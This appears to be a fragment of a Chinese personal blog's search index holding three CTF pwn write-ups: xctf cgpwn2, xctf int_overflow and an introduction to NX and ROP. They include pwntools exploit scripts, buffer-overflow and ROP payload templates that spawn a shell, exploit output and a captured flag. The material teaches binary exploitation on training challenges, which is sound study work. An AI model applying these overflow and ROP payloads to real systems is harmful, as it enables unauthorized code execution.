    <content type="html"><![CDATA[<h1 id="当目标有调用system函数，但无-bin-sh字符串时"><a href="#当目标有调用system函数，但无-bin-sh字符串时" class="headerlink" title="当目标有调用system函数，但无/bin/sh字符串时"></a>当目标有调用system函数，但无/bin/sh字符串时</h1><p>xctf pwn新手区最后三题之一，cgpwn2.</p><p>打开IDA乍一看，没有后门函数，没有明显的可导向的返回地址。</p><p><img src="/2022/03/20/create-bin-sh/bin1.png"></p><p>关注有两个读取输入的地方，一个是有限制大小的读取函数，另一个是gets()这个危险函数。</p><p>考虑到这题只开启了NX保护，栈溢出应该是必须的。</p><p>于是，思路是通过name字符串，导入“/bin/sh”字符串。</p><p>再通过gets()溢出，传入_system函数地址，最后传入/bin/sh。</p><p>\</p><blockquote><p>payload = b’a’*42 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>上面是脚本中核心语句。</p><p>b’a’*42 填充字符串和ebp</p><p>后面传入system函数地址替换原有返回地址，以调用system函数。</p><p>进入system函数后，因为这里是32位程序，推荐用布置栈帧的方式传参。</p><p>也就是，调用system后，此时位于system函数栈的ebp顶部。</p><p>需要传入一个4字节的数据，填充返回地址，然后来到传入的参数部分。</p><p>将/bin/sh 字符串的地址传入，完成传参。</p><p>达到调用system(“/bin/sh”)的目的。</p><p>劫持到程序，cat flag拿到答案。</p><p>总结下，第一眼看上去没法溢出，是因为忽略了通过传参的手段，构造一个system(“/bin/sh”)的可能性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xctf int_overflow整数类型的溢出</title>
    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="整数类型的溢出"><a href="#整数类型的溢出" class="headerlink" title="整数类型的溢出"></a>整数类型的溢出</h2><p>以xctf平台的pwn新手区int_overflow为例<br>into 为rename的elf文件</p><h3 id="0X1"><a href="#0X1" class="headerlink" title="0X1"></a>0X1</h3><blockquote><p>file into<br>chmod 777 into<br>./into</p></blockquote><p>先确定into为32位elf文件</p><h3 id="0X2"><a href="#0X2" class="headerlink" title="0X2"></a>0X2</h3><p>win环境下，32位IDA进行分析<br>有明显的后门函数what_is_this()<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic1.png" alt="no1"><br>进入login()后<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic2.png" alt="no2"><br>结合下图看看<br><img src="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/pic3.png" alt="no3"><br><br>首先，我们可以发现，目前为止，找不到合适的直接溢出点，read函数都未越界。<br>唯一的落脚点来到strcpy()上，但是，s被限制再4到8个字节大小内，如果想达到栈溢出，覆盖返回地址，却至少需要读取大于dest数组0x14大小的填充数据。<br><strong>这个时候，unsigned __int8 v3是突破口</strong><br>查资料得知，int8的意思是占8个bit，因为是无符号数，范围是0到255之间。<br>回顾一下，check_passwd()函数传入的buf长度，有0x199这么大，足矣我们完成对int8的溢出。<br>截至目前，思路为，将buf的长度控制在256+4~256+8之间，达到v3&gt;3&amp;&amp;v3&lt;=8的条件，同时通过这两百五十多字节的数据布置，完成程序的劫持。<br>编写exp脚本如下</p><blockquote><p>from pwn import*<br>p = remote(“ip_address”,port)<br>p.recv()<br>p.sendline(‘1’)<br>p.recv()<br>p.sendline(‘kawa’)<br>p.recv()<br>payload = b’a’*(0x14) + b’aaaa’ + p32(0x804868b) + b’a’*234<br>p.sendline(payload)<br>p.interactive()</p></blockquote><p>linux中</p><blockquote><p>python3 e.py<br>[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.<br>[+] Opening connection to 111.200.241.244 on port 65136: Done<br>/root/Desktop/e.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘1’)<br>/root/Desktop/e.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a href="https://docs.pwntools.com/#bytes">https://docs.pwntools.com/#bytes</a><br>  p.sendline(‘fc’)<br>[*] Switching to interactive mode<br>Hello fc</p></blockquote><p>Please input your passwd:<br>Success<br>cyberpeace{c592ce35706a19933e58ca21a03fb3c8}<br>[*] Got EOF while reading in interactive<br>$  </p><p>结束</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p><strong>本题重点是需要知道，int8是内存大小为8bit即1字节大小的空间，可以达到int类型溢出。否则无从下手！！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NX-ROP</title>
    <link href="/2022/03/02/NX-ROP/"/>
    <url>/2022/03/02/NX-ROP/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是NX与ROP"><a href="#什么是NX与ROP" class="headerlink" title="什么是NX与ROP"></a>什么是NX与ROP</h1><p><strong>NX即为no execute bit，即禁止执行位</strong><br><br>以下是wiki中文的解释</p><blockquote><p>支持NX技术的系统会把内存中的区域分类为只供存储处理器指令集与只供存储数据使用的两种。任何标记了NX位的区块代表仅供存储数据使用而不是存储处理器的指令集，处理器将不会将此处的数据作为代码执行，以此这种技术可防止多数的缓存溢出式攻ji（即一些恶意程序把自身的恶意指令集通过特殊手段放在其他程序的存储区并被执行，从而攻ji甚至控制整台电脑系统）。</p></blockquote><p>个人理解就是不能用常规的最简单的栈溢出手段，来直接修改返回地址为目标函数地址。<br><br><strong>ROP即返回导向编程（英语：Return-Oriented Programming，缩写：ROP）</strong><br>其核心思想是通过栈溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>因为开启了NX 保护，我们不可以把shellcode放到栈上来执行了，因此我们就需用用到ROP技术来迂回获得SHELL。</strong><br><br><br><strong>++本文是学习笔记形式，许多内容与原文章相同，但会加入部分个人理解。因为自学ctf确实费劲，一个地方搞不懂会困扰几天，希望我个人对样例的复现过程，和我的经验能帮助到后来者，少走弯路。++</strong><br><br><strong>原文地址</strong></p><blockquote><p><a href="https://bbs.pediy.com/thread-221041.htm">https://bbs.pediy.com/thread-221041.htm</a></p></blockquote><p>再次感谢原文大佬作者！</p><h2 id="win的IDA-pro与虚拟机中的linux联合调试方法"><a href="#win的IDA-pro与虚拟机中的linux联合调试方法" class="headerlink" title="win的IDA pro与虚拟机中的linux联合调试方法"></a>win的IDA pro与虚拟机中的linux联合调试方法</h2><p>1.在IDA中选中remote linux debugger<br><br>2.在菜单debugger下拉菜单里选择process option选项，设置如下：<br><img src="/2022/03/02/NX-ROP/cto1.png" alt="test-png"><br>其中目录就选择rop所在目录，hostname填上linux虚拟机的ip，端口默认选择23946<br><br>3.然后打开linux虚拟机，并把ida目录下的linxu_serverX64拷贝到虚拟机里并执行<br><img src="/2022/03/02/NX-ROP/cto2.png" alt="image.png"></p><p><br>4.用py编写调试代码rexp.py如下：<br><br> <br>#! /usr/bin/python<br>from pwn import *<br>import pdb<br>context.log_level = ‘debug’<br>target = process(‘./rop’)<br>elf=ELF(‘./rop’) #这个会显示rop用了哪些保护技术<br>pdb.set_trace()#这里设置一个pdb断点，可以让ida附加rop进程<br><br><br>target.sendline(‘a’64+’b’8+’c’*8)<br>target.interactive()<br>5.然后在linux系统上新开一个终端，执行rexp.py如下<br><img src="/2022/03/02/NX-ROP/cto3.png" alt="image.png"><br><br>6.在ida vuln函数里的gets函数后面下好断点<br><br>7.然后点击debugger,附加远程进程，找到./rop打开<br><img src="/2022/03/02/NX-ROP/cto4.png" alt="image.png"><br>并按F9执行<br><br>8.回到linux中，在Pdb终端里面输入n并回车（即next，下一步的意思)<br><br>9.可以看见IDA中出现同步的动态调试信息。<br><br><strong>以上便是IDA与linux的联合调试过程</strong><br><br>\</p><h2 id="开启NX保护与不开启时，做题时的不同感受"><a href="#开启NX保护与不开启时，做题时的不同感受" class="headerlink" title="开启NX保护与不开启时，做题时的不同感受"></a>开启NX保护与不开启时，做题时的不同感受</h2><p>1.开启NX以后，最直接的效果就是不能在栈上执行shellcode，也就是不能直接通过溢出，修改返回地址为shellcode，来获得shell。<br>2.但是开启NX以后，可以修改返回地址为已有的backdoor函数得到shell。<br>3.如果没有现成的backdoor函数，则需要我们想办法转移到其他空间，执行shellcode。</p><h2 id="64位与32位下，简单的应对NX保护的方式"><a href="#64位与32位下，简单的应对NX保护的方式" class="headerlink" title="64位与32位下，简单的应对NX保护的方式"></a>64位与32位下，简单的应对NX保护的方式</h2><p>即构造ROP链<br>1.64位环境下，一般先搜索有类似“pop rdi ; ret;”形式的代码段<br>命令：</p><blockquote><p>ROPgadget –binary 文件名 | grep “pop rdi”</p></blockquote><p>找到相关代码段后，payload第一部分覆盖缓冲区和rbp（ebp）后，便接上ROPgadget找到的gadget地址。<br>为什么要寻找pop rdi呢？<br>因为函数第一个参数一般都存在rdi中，这样可以达到传参的目的。<br>再寻找”/bin/sh”字符串地址，链接在rop链后。<br>随后传入_system函数地址，作用是，通过ret指令，跳转至该地址，执行system()<br>此时rdi已经被设置好为”/bin/sh”，即会执行system(“/bin/sh”)<br>获得系统权限。<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*8 + p64(pop_rdi_addr) + p64(/bin/sh_addr) + p64(_system_addr)</p></blockquote><p>2.32位环境下一般采用布置栈帧，达到调用函数、传递参数的目的<br>payload一般如下：</p><blockquote><p>payload = b’A’*(缓冲区长度) + b’B’*4 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>首先，覆盖完缓冲区后，为了达到返回地址处，要覆盖ebp，ebp的大小是4个字节。<br>然后通过修改返回地址，进入system函数，此时我们位于system函数栈帧中的ebp处，我们需要填充一下ebp下面的返回地址，随便设置为0x0.<br>紧接着导入/bin/sh字符串，达到传参的目的。</p><p><br>以上便是本人对NX及ROP技术初次认识的浅显简介，让各位见笑了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
